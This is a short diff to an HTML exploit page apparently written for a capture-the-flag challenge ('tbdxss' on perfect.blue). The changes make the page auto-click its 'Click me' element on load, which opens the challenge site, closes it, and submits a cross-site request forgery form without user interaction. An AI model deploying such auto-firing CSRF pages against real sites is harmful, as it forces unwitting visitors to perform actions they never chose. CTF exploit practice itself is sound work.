@@ -1,11 +1,16 @@
 <script>
+    window.onload = function () {
+            let btn = document.getElementById('plsClickme');
+            btn.click()
+    };
+
     function go() {
         let w = window.open("https://tbdxss.chal.perfect.blue/", ''); // i dunno what to add here 
         setTimeout(function () { w.close(); csrf.submit() }, 1000)
     }
 </script>
 
-<h1 onclick=go()>Click me</h1>
+<h1 onclick=go() id="plsClickme">Click me</h1>
 
 
 <!--
